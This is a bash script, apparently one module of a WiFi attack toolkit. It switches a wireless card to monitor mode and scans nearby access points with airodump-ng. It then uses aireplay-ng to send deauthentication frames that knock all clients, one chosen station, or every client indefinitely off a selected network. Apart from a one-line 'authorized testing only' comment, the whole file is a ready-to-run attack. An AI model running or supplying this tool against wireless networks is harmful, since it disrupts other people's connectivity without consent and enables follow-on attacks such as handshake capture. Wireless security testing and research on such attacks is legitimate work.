#!/bin/bash
# Deauthentication Attack Module
# Authorized security testing only

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

BASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
MON=""
IFACE=""

cleanup() {
    echo -e "\n${YELLOW}[*] Stopping deauth / monitor...${NC}"
    pkill -f "aireplay-ng" 2>/dev/null || true
    pkill -f "airodump-ng" 2>/dev/null || true
    if [ -n "$MON" ]; then
        airmon-ng stop "$MON" >/dev/null 2>&1 || true
    fi
    if command -v systemctl >/dev/null 2>&1; then
        systemctl start NetworkManager 2>/dev/null || true
    fi
    echo -e "${GREEN}[✓] Done${NC}"
}
trap cleanup INT TERM

echo -e "${CYAN}"
echo "╔════════════════════════════════════╗"
echo "║         Deauth Attack Module       ║"
echo "╚════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${YELLOW}Interfaces:${NC}"
iw dev 2>/dev/null | awk '/Interface/{print "  "$2}'
ip -o link show 2>/dev/null | awk -F': ' '{print "  "$2}'
echo ""

read -rp "Interface (e.g. wlan0): " IFACE
[ -z "$IFACE" ] && echo -e "${RED}Required${NC}" && exit 1

echo -e "${GREEN}[+] Monitor mode...${NC}"
airmon-ng check kill >/dev/null 2>&1 || true
airmon-ng start "$IFACE" >/dev/null 2>&1 || true

MON="${IFACE}mon"
if [ ! -e "/sys/class/net/$MON" ]; then
    if iwconfig "$IFACE" 2>/dev/null | grep -qi "Mode:Monitor"; then
        MON="$IFACE"
    else
        MON=$(iw dev 2>/dev/null | awk '/Interface/ {print $2}' | grep -E 'mon' | tail -n1)
        [ -z "$MON" ] && MON="$IFACE"
    fi
fi
echo -e "${BLUE}[*] Using monitor iface: $MON${NC}"

SCAN_FILE="$BASE_DIR/capture/deauth_scan_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$BASE_DIR/capture"
echo -e "${GREEN}[+] Scanning networks (15 seconds)...${NC}"
timeout 15 airodump-ng --output-format csv -w "$SCAN_FILE" "$MON" 2>/dev/null || true

CSV=$(ls -1 "${SCAN_FILE}"*.csv 2>/dev/null | head -n1)
if [ -n "$CSV" ]; then
    echo -e "\n${GREEN}Nearby APs:${NC}"
    awk -F',' '
      BEGIN{printf "%-3s %-18s %-6s %-5s %-20s\n","#","BSSID","CH","PWR","ESSID"}
      /Station MAC/{exit}
      NR>2 && $1 ~ /([0-9A-Fa-f]{2}:){5}/ {
        i++
        b=$1; ch=$4; pwr=$9; ess=$14
        gsub(/^[ \t]+|[ \t]+$/,"",b)
        gsub(/^[ \t]+|[ \t]+$/,"",ch)
        gsub(/^[ \t]+|[ \t]+$/,"",pwr)
        gsub(/^[ \t]+|[ \t]+$/,"",ess)
        printf "%-3s %-18s %-6s %-5s %-20s\n", i, b, ch, pwr, ess
      }' "$CSV"

    awk -F',' '
      /Station MAC/{exit}
      NR>2 && $1 ~ /([0-9A-Fa-f]{2}:){5}/ {
        i++
        b=$1; ch=$4; ess=$14
        gsub(/^[ \t]+|[ \t]+$/,"",b)
        gsub(/^[ \t]+|[ \t]+$/,"",ch)
        gsub(/^[ \t]+|[ \t]+$/,"",ess)
        print i","b","ch","ess
      }' "$CSV" > /tmp/wifitool_ap_map.txt
fi

echo ""
echo -e "${YELLOW}Enter target manually or pick number from list${NC}"
read -rp "BSSID or #: " INPUT

if [[ "$INPUT" =~ ^[0-9]+$ ]] && [ -f /tmp/wifitool_ap_map.txt ]; then
    LINE=$(grep "^${INPUT}," /tmp/wifitool_ap_map.txt | head -n1)
    BSSID=$(echo "$LINE" | cut -d, -f2)
    CHANNEL=$(echo "$LINE" | cut -d, -f3)
    ESSID=$(echo "$LINE" | cut -d, -f4-)
    echo -e "${BLUE}Selected: $ESSID ($BSSID) ch $CHANNEL${NC}"
else
    BSSID="$INPUT"
    read -rp "Channel: " CHANNEL
    ESSID="unknown"
fi

[ -z "$BSSID" ] || [ -z "$CHANNEL" ] && echo -e "${RED}BSSID and Channel required${NC}" && exit 1

iwconfig "$MON" channel "$CHANNEL" 2>/dev/null || iw dev "$MON" set channel "$CHANNEL" 2>/dev/null || true

echo ""
echo -e "${YELLOW}Attack type:${NC}"
echo "  1) Deauth ALL clients on AP"
echo "  2) Deauth ONE client (station MAC)"
echo "  3) Continuous deauth forever (Ctrl+C stop)"
read -rp "> " ATYPE
ATYPE=${ATYPE:-1}

read -rp "Packet count [0=infinite]: " PKTS
PKTS=${PKTS:-0}

case "$ATYPE" in
    2)
        echo -e "${GREEN}[+] Capturing stations 10s (watch airodump if opened)...${NC}"
        timeout 10 airodump-ng --bssid "$BSSID" -c "$CHANNEL" --output-format csv -w "$BASE_DIR/capture/stations" "$MON" 2>/dev/null || true
        read -rp "Station MAC: " STATION
        [ -z "$STATION" ] && echo -e "${RED}Station required${NC}" && exit 1
        echo -e "${RED}[!] Deauth $STATION from $BSSID ...${NC}"
        aireplay-ng --deauth "$PKTS" -a "$BSSID" -c "$STATION" "$MON" --ignore-negative-one
        ;;
    3)
        echo -e "${RED}[!] Continuous deauth on $BSSID ... Ctrl+C to stop${NC}"
        aireplay-ng --deauth 0 -a "$BSSID" "$MON" --ignore-negative-one
        ;;
    *)
        echo -e "${RED}[!] Deauth ALL clients on $BSSID (count=$PKTS)...${NC}"
        aireplay-ng --deauth "$PKTS" -a "$BSSID" "$MON" --ignore-negative-one
        ;;
esac

cleanup
